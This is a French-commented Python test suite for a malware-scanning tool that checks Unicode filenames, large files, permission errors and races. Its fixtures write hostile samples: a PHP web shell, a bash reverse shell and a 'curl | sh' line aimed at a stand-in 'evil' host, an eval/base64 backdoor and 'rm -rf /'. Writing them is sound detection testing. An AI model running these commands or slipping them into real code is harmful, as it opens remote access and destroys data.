"""P4-C : tests hostiles — couverture des cas qui pètent en production.

Le bug : les tests « gentils » passent avec des noms ASCII, des
fichiers de 10 octets, des permissions standard. En production, on
rencontre des :
  - noms Unicode (emoji, CJK, RTL)
  - fichiers énormes (log de plusieurs Go)
  - permissions refusées (utilisateur sans droit, setuid, read-only mount)
  - courses (un fichier disparaît entre snapshot et lecture)

Le fix : on ajoute une batterie de tests qui couvrent ces cas. Pour
certains (permissions refusées, courses), on accepte que le code
**survit** (pas de crash, retourne une erreur explicite) plutôt que
de réussir un traitement idéal.
"""

import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sentinel.files import looks_binary, read_text_safely
from sentinel.integrity import diff_against_baseline, make_baseline
from sentinel.quarantine import quarantine_paths, restore_paths
from sentinel.scanner import scan_folder
from sentinel.watch import _snapshot, watch_polling


class TestUnicodeFilenames(unittest.TestCase):
    """Les noms Unicode (CJK, emoji, accents) doivent fonctionner."""

    def test_unicode_filename_is_scanned(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            # CJK (chinois) — historique : un fichier .php en chinois
            # contenant eval() était ignoré avant P0-1. Le test
            # confirme qu'on le détecte.
            f_cjk = td_p / "测试.php"
            f_cjk.write_text('<?php system($_GET["x"]); ?>\n', encoding="utf-8")
            # Emoji
            f_emoji = td_p / "\U0001f980.sh"
            f_emoji.write_text("#!/bin/sh\nbash -i >& /dev/tcp/evil/4444 0>&1\n", encoding="utf-8")
            # Accents français
            f_acc = td_p / "référence.sh"
            f_acc.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")

            report = scan_folder(td_p)
            paths = {f.path for f in report.findings}
            self.assertIn("测试.php", paths, f"CJK filename pas scanné : {paths}")
            self.assertIn("\U0001f980.sh", paths, f"Emoji filename pas scanné : {paths}")
            self.assertIn("référence.sh", paths, f"Accents pas scannés : {paths}")

    def test_unicode_in_file_content(self) -> None:
        """Le contenu Unicode doit être correctement décodé (P0-1 : pas
        confondu avec du binaire)."""
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            f = td_p / "innocent.txt"
            f.write_text("Variable = 'π的值是3.14'\n", encoding="utf-8")
            # read_text_safely doit retourner le texte, pas None.
            text = read_text_safely(f)
            self.assertIsNotNone(text)
            self.assertIn("π", text)

    def test_unicode_in_baseline(self) -> None:
        """Un fichier Unicode dans un dossier doit apparaître dans la baseline."""
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            (td_p / "测试.txt").write_text("contenu", encoding="utf-8")
            bl = make_baseline(td_p)
            paths = [e["path"] for e in bl["entries"]]
            self.assertIn("测试.txt", paths)


class TestLargeFiles(unittest.TestCase):
    """Les gros fichiers ne doivent pas crasher.

    `read_text_safely` reste un échantillon borné (anomalie / neuronal).
    Le scan de signatures couvre tout le fichier par fenêtres
    (`tests/test_audit_remaining.py`).
    """

    def test_very_large_file_does_not_crash(self) -> None:
        """Un fichier de 2 MB doit être lu partiellement (tronqué) sans
        faire planter le scan."""
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            big = td_p / "big.log"
            # 2 MB de lignes répétées (pas un binaire — doit être lisible).
            line = "X" * 1000 + "\n"
            content = line * 2000  # ~2 MB
            big.write_text(content)
            # Le scan doit s'achever sans crash.
            report = scan_folder(td_p)
            # Le fichier apparaît dans la baseline même tronqué.
            self.assertGreaterEqual(len(report.findings), 0)

    def test_default_max_file_bytes_respected(self) -> None:
        """read_text_safely doit tronquer à DEFAULT_MAX_FILE_BYTES."""
        from sentinel.files import DEFAULT_MAX_FILE_BYTES

        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            f = td_p / "huge.txt"
            f.write_text("A" * (DEFAULT_MAX_FILE_BYTES + 10000))
            text = read_text_safely(f)
            self.assertIsNotNone(text)
            self.assertLessEqual(len(text), DEFAULT_MAX_FILE_BYTES + 100)  # petite marge


class TestPermissions(unittest.TestCase):
    """Les cas où l'OS refuse l'accès ne doivent pas crasher."""

    def test_unreadable_file_is_skipped_gracefully(self) -> None:
        """Un fichier illisible ne crashe pas : il est signalé (exit 3),
        pas lu, et ne produit pas de finding.

        POSIX : mode 000. Windows : ACE deny (chmod n'empêche pas la lecture).
        """
        from tests.osutil import allow_read, deny_read, is_privileged

        if is_privileged():
            self.skipTest("root peut lire n'importe quoi, test non pertinent")
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            f = td_p / "secret.php"
            f.write_text("<?php eval(base64_decode($_POST['x'])); ?>\n")
            previous = deny_read(f)
            try:
                report = scan_folder(td_p)
                paths = {hit.path for hit in report.findings}
                self.assertNotIn("secret.php", paths)
                self.assertIn("secret.php", report.unreadable)
                self.assertEqual(report.exit_code, 3)
            finally:
                allow_read(f, previous)

    def test_quarantine_missing_source_is_reported(self) -> None:
        """Quarantaine d'un fichier inexistant doit retourner un échec
        explicite (pas un crash silencieux)."""
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            ghost = td_p / "does_not_exist.sh"
            dest = Path(tempfile.mkdtemp(prefix="q-"))
            records, failures = quarantine_paths(
                [ghost],
                dest_dir=dest,
                manifest_path=dest / "manifest.jsonl",
            )
            self.assertEqual(len(records), 0)
            self.assertEqual(len(failures), 1)
            # Le path qui a échoué est dans le tuple (path, reason).
            self.assertIn("does_not_exist.sh", str(failures[0][0]))


class TestConcurrentModification(unittest.TestCase):
    """Le scan doit survivre à un fichier qui disparaît entre le snapshot
    et la lecture (race condition classique en production)."""

    def test_scan_survives_deleted_file(self) -> None:
        """Si un fichier est supprimé pendant le scan, on n'a pas de
        crash — il est juste absent des findings."""
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            victim = td_p / "disappearing.sh"
            victim.write_text("#!/bin/sh\nrm -rf /\n")

            # Patch la lecture pour supprimer le fichier juste avant,
            # simulant un file deleted under us.
            import sentinel.scanner as scanner_mod

            real = scanner_mod.iter_text_windows

            def race_read(p, *a, **kw):
                if p.name == "disappearing.sh":
                    try:
                        p.unlink()
                    except FileNotFoundError:
                        pass
                return real(p, *a, **kw)

            scanner_mod.iter_text_windows = race_read
            try:
                report = scan_folder(td_p)
                # Le fichier a été supprimé pendant le scan : pas de crash,
                # et pas un « illisible » (il n'existe plus).
                self.assertIsNotNone(report)
                self.assertNotIn("disappearing.sh", report.unreadable)
            finally:
                scanner_mod.iter_text_windows = real


class TestDeterministicWatch(unittest.TestCase):
    """P4-C : watch déterministe avec sleep injectable — pas de sleep réel."""

    def test_watch_with_fake_sleep_runs_n_iterations(self) -> None:
        """Avec un sleep déterministe (no-op), watch_polling atteint
        max_iterations en un temps record (pas de sleep réel)."""
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            target = td_p / "f.txt"
            target.write_text("v1\n")

            call_count = [0]

            def fake_sleep(_seconds: float) -> None:
                call_count[0] += 1
                # Pas de sleep réel — déterministe.

            events: list[dict] = []
            t0 = time.monotonic()
            watch_polling(
                td_p,
                interval=1.0,
                on_change=lambda d: events.append(d),
                max_iterations=5,
                sleep=fake_sleep,
            )
            elapsed = time.monotonic() - t0

            # Le test doit finir en <100ms (pas 5 secondes réelles).
            self.assertLess(
                elapsed, 0.5, f"watch avec sleep réel a pris {elapsed:.2f}s (devrait être <0.5s)"
            )
            # Le fake_sleep a été appelé 5 fois.
            self.assertEqual(call_count[0], 5)

    def test_watch_detects_modification_with_fake_clock(self) -> None:
        """Avec un fake sleep qui ne dort pas, on peut modifier le fichier
        entre deux itérations et vérifier la détection."""
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            target = td_p / "f.txt"
            target.write_text("v1\n")

            iteration = [0]

            def fake_sleep(_seconds: float) -> None:
                # Modifie le fichier à la 2ème itération.
                iteration[0] += 1
                if iteration[0] == 2:
                    target.write_text("v2\n")

            events: list[dict] = []
            watch_polling(
                td_p,
                interval=0.0,
                on_change=lambda d: events.append(d),
                max_iterations=3,
                sleep=fake_sleep,
            )

            # Au moins un événement détecté (la modification de v1 → v2).
            self.assertGreater(len(events), 0, f"aucun event détecté avec fake clock : {events!r}")


if __name__ == "__main__":
    unittest.main()
